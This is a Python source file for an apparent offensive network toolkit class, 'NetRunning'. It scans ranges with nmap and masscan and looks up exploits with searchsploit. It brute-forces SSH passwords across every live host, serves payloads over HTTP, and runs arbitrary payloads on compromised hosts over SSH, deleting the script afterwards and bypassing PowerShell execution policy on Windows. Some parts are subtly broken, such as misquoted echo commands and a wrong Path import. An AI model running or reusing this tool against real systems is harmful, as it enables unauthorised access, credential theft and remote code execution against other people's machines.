import re
import os
from click import Path
from flask import json
import paramiko
from computerspeak import ComputerSpeak as cs
from fileshuttle import FileShuttle as fs
import subprocess
import platform
import time
import socket
from nmap import PortScanner
import os
from target_config import TARGET_IP, TARGET_INTERFACE, SELF_IP_RE, TARGET_RANGE, IPV4_RE
class NetRunning:
    def __init__(self):
        self.cs = cs()
        self.fs = fs()
    def scan_network(self, target_ip_range: str, scripts: list = None):
        """Scan the network for active hosts using nmap. Optionally, run specific nmap scripts against the detected hosts."""
        self.cs.speak(f"Scanning network range {target_ip_range} for active hosts...")
        nm = PortScanner()
        try:
            nm.scan(hosts=target_ip_range, arguments=f'-sn -oN {target_ip_range.replace("/", "_")}_nmap_results.txt')
            active_hosts = [host for host in nm.all_hosts() if nm[host].state() == 'up']
            self.cs.speak(f"Active hosts detected: {active_hosts}")
            return active_hosts
        except Exception as e:
            self.cs.speak(f"An error occurred while scanning the network: {e}")
            return []


    def create_server(self,folder:str, port: int):
        """Create a simple HTTP server on the specified port to serve files or payloads."""
        self.cs.speak(f"Starting simple HTTP server on port {port}")
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.bind(('', port))
        if platform.system() == "Windows":
            command = f"python -m http.server {port} --directory {folder}"
        else:
            command = f"python3 -m http.server {port} --directory {folder}"
        subprocess.Popen(command, shell=True)



    def stop_server(self):
        """Stop the HTTP server."""
        self.cs.speak("Stopping HTTP server")
        if hasattr(self, 'socket'):
            self.socket.close()



    def search_sploit(self, service: str):
        """Search for exploits related to a specific service using searchsploit."""
        self.cs.speak(f'Searching for exploits related to {service}')
        command = f"searchsploit -c {service} -j"
        result = self.cs.execute_command(command)
        if result:
            try:
                exploits = json.loads(result)
                self.cs.speak(f"Exploits found for {service}: {exploits}")
                return exploits
            except json.JSONDecodeError:
                self.cs.speak(f"Failed to parse searchsploit output for {service}. Raw output: {result}")
                return None
        else:
            self.cs.speak(f"No exploits found for {service}")
            return None
        
    def iter_nmap_lines(self, path=None):
        if path is None:
            path = Path(__file__).resolve().parents[1] / "nmap_results.txt"
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            for line in f:
                yield line.rstrip("\n")

    @staticmethod
    def ssh_payload(host, username, password=None, payload=None):
        """Execute a payload on a remote host via SSH. This function detects the target OS and executes the payload accordingly, ensuring compatibility with both Windows and Linux systems."""
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=username, password=password)

        def run(cmd):
            stdin, stdout, stderr = client.exec_command(cmd)
            return stdout.read().decode().strip(), stderr.read().decode().strip()

        # 1. Detect OS using whoami output
        who, _ = run("whoami")

        # Windows OpenSSH returns:  HOSTNAME\username
        # Linux returns:             username
        if "\\" in who:
            os_type = "windows"
        else:
            os_type = "linux"

        results = {"os": os_type, "whoami": who}

        # 2. Branch based on OS
        if os_type == "windows":
            results["cmd1"] = run("touch afile.sh")[0]
            results["cmd2"] = run(f"echo'{payload} | tee afile.sh")[0]
            results["cmd3"] = run("powershell -ExecutionPolicy Bypass -File afile.sh")[0]
            results["cmd4"] = run("./afile.sh")[0]
            results["cmd5"] = run("powershell Remove-Item -Path afile.sh")[0]
        else:  # linux
            results["cmd1"] = run("touch afile.sh")[0]
            results["cmd2"] = run(f"echo '{payload}' | tee afile.sh")[0]
            results["cmd3"] = run("chmod +x afile.sh")[0]
            results["cmd4"] = run("./afile.sh")[0]
            results["cmd5"] = run("rm -f afile.sh")[0]
        client.close()
        csi=cs()
        csi.speak(f"SSH payload execution results: {results}")

        return results


    @staticmethod
    def web_payload(host, port, payload=None):
        """Serve a payload over HTTP on the specified host and port, remember this needs a thread to continue running in the background, and it also needs to be called from the main function so it doesn't just end immediately. :D"""
        import http.server
        import socketserver
        import threading

        class Handler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(payload.encode())

        with socketserver.TCPServer((host, port), Handler) as httpd:
            print(f"Serving payload on {host}:{port}")
            thread = threading.Thread(target=httpd.serve_forever)
            thread.daemon = True
            thread.start()
            return httpd, thread


        
    @staticmethod
    def check_ssh_connection(host, username, password=None):
        """Check if SSH connection to the target host is successful. This function uses the Paramiko library to attempt an SSH connection to the target IP using the provided username and password. It returns True if the connection is successful, or False if it fails. The function includes error handling to catch and report any SSH exceptions, socket errors, or unexpected exceptions that may occur during the connection attempt."""
        csi=cs()
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh_client.connect(host, username=username, password=password, timeout=5)
            ssh_client.close()
            return True
        except paramiko.AuthenticationException:
            csi.speak(f"SSH authentication failed for {host} with username {username}.")
            return False
        except paramiko.SSHException as e:
            csi.speak(f"SSH connection failed for {host} with username {username}. SSHException: {e}")
            return False
        except socket.error as e:
            csi.speak(f"Socket error occurred while connecting to {host} on SSH port: {e}")
            return False
        except Exception as e:
            csi.speak(f"An unexpected error occurred while connecting to {host} on SSH port: {e}")
            return False
    @staticmethod
    def brute_scan(target_ip_range: str, username: str, password_list: list):
        """Perform a brute-force scan for SSH credentials on the target IP range using the provided username and a list of passwords."""
        csi = cs()
        nri= NetRunning()
        csi.speak(f"Starting brute-force scan for SSH credentials on {target_ip_range} with username {username}")
        active_hosts = nri.scan_network(target_ip_range=target_ip_range, scripts=['auth'])
        valid_credentials = []
        for host in active_hosts:
            for password in password_list:
                if NetRunning.check_ssh_connection(host, username, password):
                    csi.speak(f"Valid SSH credentials found for {host}: {username}:{password}")
                    valid_credentials.append((host, username, password))
                    break  # Stop trying passwords for this host after finding valid credentials
                else:
                    csi.speak(f"Invalid SSH credentials for {host}: {username}:{password}")
        csi.speak(f"Brute-force scan complete. Valid credentials found: {valid_credentials}")
        return valid_credentials
    @staticmethod
    def loud_scan(target_ip_range: str, rate=1000):
        """Perform a loud scan of the target IP range using nmap with aggressive timing and verbose output."""
        csi = cs()
        csi.speak(f"Starting loud scan of {target_ip_range} with rate {rate} packets per second")
        masscanr=csi.execute_command(f"masscan -p0-65535 --rate {rate} {target_ip_range} -oL loud_scan_results.txt")
        return masscanr